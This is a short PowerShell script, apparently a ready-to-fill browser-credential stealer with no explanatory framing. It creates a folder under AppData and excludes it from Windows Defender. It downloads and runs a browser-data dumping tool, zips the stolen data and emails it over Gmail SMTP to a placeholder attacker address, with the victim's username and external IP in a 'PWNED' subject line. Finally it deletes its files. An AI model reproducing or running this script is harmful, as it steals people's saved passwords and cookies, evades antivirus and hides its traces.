mkdir "$env:appdata\Microsoft\dump"
Set-Location "$env:appdata\Microsoft\dump"
Add-MpPreference -ExclusionPath "$env:appdata\Microsoft\dump"
Invoke-WebRequest 'hackbrowser.exe file link' -OutFile "hb.exe"
.\hb.exe --format json
Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
Compress-Archive -Path * -DestinationPath dump.zip
$Random = Get-Random
$Message = new-object Net.Mail.MailMessage
$smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587)
$smtp.Credentials = New-Object System.Net.NetworkCredential("your email address", "your email password");
$smtp.EnableSsl = $true
$Message.From = "your email address"
$Message.To.Add("your email address")
$ip = Invoke-RestMethod "myexternalip.com/raw"
$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
$Message.Body = $ComputerName
$files=Get-ChildItem 
$Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
$smtp.Send($Message)
$Message.Dispose()
$smtp.Dispose()
cd "$env:appdata"
Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
